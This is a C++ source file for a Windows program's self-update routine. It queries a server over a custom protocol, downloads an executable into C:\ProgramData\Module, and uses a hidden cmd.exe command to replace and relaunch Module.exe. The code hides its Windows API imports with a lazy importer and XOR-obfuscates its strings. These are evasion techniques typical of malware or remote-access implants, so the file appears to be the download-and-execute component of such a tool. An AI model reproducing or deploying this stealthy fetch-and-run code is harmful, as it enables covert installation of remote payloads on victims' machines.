#include "update.hpp"
#include "net/wire.hpp"
#include "vendor/lazy_importer.hpp"
#include "vendor/xor_string.hpp"
#include <Windows.h>
#include <cstdio>
#include <cstring>
#include <vector>
namespace update
{
    namespace
    {
        bool write_all_bytes(const wchar_t* path, const void* data, size_t size)
        {
            HANDLE file = LI_KERNEL(CreateFileW)(path, GENERIC_WRITE, 0, nullptr,
                                      CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);
            if (file == INVALID_HANDLE_VALUE)
                return false;

            DWORD written = 0;
            const BOOL ok = LI_KERNEL(WriteFile)(file, data, static_cast<DWORD>(size), &written, nullptr);
            LI_KERNEL(CloseHandle)(file);
            return ok && written == static_cast<DWORD>(size);
        }
    }

    bool check_and_apply(const wchar_t* current_version)
    {
        char version_ansi[32]{};
        WideCharToMultiByte(CP_UTF8, 0, current_version, -1, version_ansi, 31, nullptr, nullptr);

        const auto req = wire::pack_update_check(version_ansi);

        std::vector<uint8_t> rsp_inner;
        uint32_t rsp_opcode = 0;
        if (!wire::transact(static_cast<uint16_t>(wire::opcode::update_check_req),
                            req, rsp_inner, rsp_opcode))
            return false;

        if (rsp_opcode != static_cast<uint32_t>(wire::opcode::update_check_rsp))
            return false;

        bool update_available = false;
        std::string new_version;
        if (!wire::unpack_update_check_rsp(rsp_inner, update_available, new_version))
            return false;
        if (!update_available)
            return false;

        (void)new_version;

        std::vector<uint8_t> exe_bytes;
        if (!wire::download_file(exe_bytes) || exe_bytes.empty())
            return false;

        const std::wstring target_dir  = XSW(L"C:\\ProgramData\\Module");
        const std::wstring target_file = target_dir + XSW(L"\\Module.exe");
        const std::wstring temp_file   = target_dir + XSW(L"\\Module_update.exe");

        LI_KERNEL(CreateDirectoryW)(target_dir.c_str(), nullptr);

        if (!write_all_bytes(temp_file.c_str(), exe_bytes.data(), exe_bytes.size()))
            return false;

        wchar_t command_line[2048];
        swprintf_s(command_line,
                   XSW(L"cmd.exe /c ping -n 4 127.0.0.1 > nul "
                       L"& move /y \"%s\" \"%s\" "
                       L"& start \"\" \"%s\""),
                   temp_file.c_str(),
                   target_file.c_str(),
                   target_file.c_str());

        STARTUPINFOW si{};
        si.cb = sizeof(si);
        si.dwFlags = STARTF_USESHOWWINDOW;
        si.wShowWindow = SW_HIDE;

        PROCESS_INFORMATION pi{};
        if (!LI_KERNEL(CreateProcessW)(nullptr, command_line, nullptr, nullptr, FALSE,
                            CREATE_NO_WINDOW, nullptr, nullptr, &si, &pi))
        {
            LI_KERNEL(DeleteFileW)(temp_file.c_str());
            return false;
        }

        LI_KERNEL(CloseHandle)(pi.hProcess);
        LI_KERNEL(CloseHandle)(pi.hThread);
        return true;
    }
}